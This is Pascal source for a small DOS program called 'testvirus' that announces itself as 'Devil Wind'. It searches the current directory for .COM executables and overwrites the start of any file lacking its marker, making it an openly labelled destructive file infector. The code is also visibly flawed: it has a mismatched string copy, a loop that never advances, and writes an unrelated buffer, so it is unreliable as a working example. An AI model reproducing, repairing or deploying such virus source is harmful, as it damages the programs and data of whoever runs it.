{$i-}
program testvirus;
uses dos;
const
  dw : string[15] = 'Devil Wind...';
  dwsize =  4100;
var
 srec : searchrec;
 cdir : string[66];
 cdirl : byte absolute cdir;
 thefile : file;
 buffer : array[byte] of byte;
 testid : string[15];
 markinfected : string[15];
begin
  writeln (dw);
   getdir(1, cdir);
     if pos('\', cdir) <> cdirl then
        begin
          cdir := cdir + '\';
          cdir := cdir + '*.COM';
        end else
             begin
               cdir := cdir + '*.COM';
             end;
      findfirst(cdir, anyfile, srec);
        while doserror = 0 do
           begin
             assign(thefile, srec.name);
             reset(thefile);
               if ioresult = 0 then
                  begin
                    blockread(thefile, buffer, 2);
                    move(buffer[$80], testid, 20);
                  end else
                        begin
                          findnext(srec);
                        end;
                   if testid <> dw then
                      begin
                        seek(thefile, 0);
                        markinfected := dw;
                        blockwrite(thefile, buffer, succ(dwsize shr 7));
                        close(thefile);
                      end;
                    end;
end.